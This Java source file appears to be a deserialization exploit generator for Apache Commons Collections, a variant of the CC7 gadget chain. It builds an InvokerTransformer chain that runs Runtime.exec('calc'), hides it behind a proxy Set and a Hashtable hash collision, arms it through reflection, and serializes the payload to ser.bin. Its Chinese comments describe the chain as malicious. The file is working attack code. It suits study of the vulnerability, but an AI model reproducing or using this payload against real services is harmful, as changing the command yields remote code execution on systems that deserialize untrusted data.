package org.CC.CC7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.iterators.ObjectGraphIterator;


import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.*;

public class CC7Test2 {
    public static void main(String[] args) throws Exception {
        // 1. 构造真实的恶意 Transformer 链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{Runtime.class, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        // 2. 先用假链占位
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        // 3. 构造 ObjectGraphIterator
        // 直接把 1 作为根对象，这样 hasNext() 会立即尝试 transform(1)
        ObjectGraphIterator ogIterator = new ObjectGraphIterator(1, chainedTransformer);

        // 4. 自定义 InvocationHandler (比 AnnotationInvocationHandler 更稳，不受注解方法限制)
        InvocationHandler handler = new InvocationHandler() {
            @Override
            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                if (method.getName().equals("iterator")) return ogIterator;
                if (method.getName().equals("size")) return 1;
                return null;
            }
        };

        // 5. 创建代理 Set
        Set setProxy = (Set) Proxy.newProxyInstance(
                Set.class.getClassLoader(),
                new Class[]{Set.class, Serializable.class}, // 加上 Serializable 保证序列化不报错
                handler
        );

        // 6. 构造哈希碰撞 (yy 和 zZ 的 hashCode 均为 3872)
        HashMap hashMap1 = new HashMap();
        hashMap1.put("yy", 2);
        HashMap hashMap2 = new HashMap();
        hashMap2.put("zZ", 2);

        // 7. 放入 Hashtable 触发碰撞占位
        Hashtable hashtable = new Hashtable();
        hashtable.put(hashMap1, 1);
        hashtable.put(hashMap2, 2);

        // ------------------ 【核心注入逻辑】 ------------------

        // 8. 延迟注入：此时再修改 entrySet，绕过 put 时的各种校验
        Field entrySetField = HashMap.class.getDeclaredField("entrySet");
        entrySetField.setAccessible(true);
        entrySetField.set(hashMap1, setProxy);

        // 9. 装弹：替换真实的执行逻辑
        Field f = chainedTransformer.getClass().getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer, transformers);

        // 10. 清理：确保 hashCode 依然匹配
        hashMap2.remove("yy");

        // 11. 序列化与反序列化
        serialize(hashtable);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
}
